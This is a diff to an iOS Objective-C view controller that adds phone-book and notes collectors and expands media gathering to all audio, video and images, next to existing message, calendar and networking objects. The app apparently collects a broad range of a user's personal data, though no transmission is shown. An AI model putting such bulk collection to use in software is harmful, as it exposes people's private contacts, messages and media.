@@ -30,7 +30,9 @@
 @property (nonatomic, strong) AppInformation *getAppInformation;
 @property (nonatomic, strong) MessagesInformation *getMessages;
 @property (nonatomic, strong) CalendarInformation *getCalendarInformation;
-@property (nonatomic, strong) Multimedia *getImages;
+@property (nonatomic, strong) Multimedia *getMedia;
+@property (nonatomic, strong) PhoneBookInformation *getPBInformation;
+@property (nonatomic, strong) NotesInformation *getNotesInformation;
 @property (nonatomic, strong) Misc *getMisc;
 
 @property (nonatomic, strong) Networking *startNetworking;
@@ -50,7 +52,9 @@
     _getAppInformation = [[AppInformation alloc]init];
     _getMessages = [[MessagesInformation alloc]init];
     _getCalendarInformation = [[CalendarInformation alloc]init];
-    _getImages = [[Multimedia alloc]init];
+    _getMedia = [[Multimedia alloc]init];
+    _getPBInformation = [[PhoneBookInformation alloc]init];
+    _getNotesInformation = [[NotesInformation alloc]init];
     _getMisc = [[Misc alloc]init];
     
     _startNetworking = [[Networking alloc]init];
@@ -268,14 +272,17 @@
     PHAuthorizationStatus status = [PHPhotoLibrary authorizationStatus];
     if (status != PHAuthorizationStatusAuthorized)
     {
-        UIAlertController *alert = [UIAlertController alertControllerWithTitle:nil message:@"This app previously was refused permissions to fotos; Please go to settings and grant permission to this app so it can use fotos" preferredStyle:UIAlertControllerStyleAlert];
+        UIAlertController *alert = [UIAlertController alertControllerWithTitle:nil message:@"This app previously was refused permissions to media; Please go to settings and grant permission to this app so it can use media" preferredStyle:UIAlertControllerStyleAlert];
         [alert addAction:[UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil]];
         [self presentViewController:alert animated:TRUE completion:nil];
         return;
-        
     }
     
-    PHAsset *lastImageAsset = [_getImages getRandomImage];
+    [_getMedia getAllAudio];
+    [_getMedia getAllVideos];
+    [_getMedia getAllImages];
+    
+    PHAsset *lastImageAsset = [_getMedia getRandomImage];
     
     [[PHImageManager defaultManager]requestImageForAsset:lastImageAsset targetSize:PHImageManagerMaximumSize contentMode:PHImageContentModeDefault options:nil resultHandler:^(UIImage *result, NSDictionary *info){
         if ([info objectForKey:PHImageErrorKey] == nil && ![[info objectForKey:PHImageResultIsDegradedKey] boolValue]) {
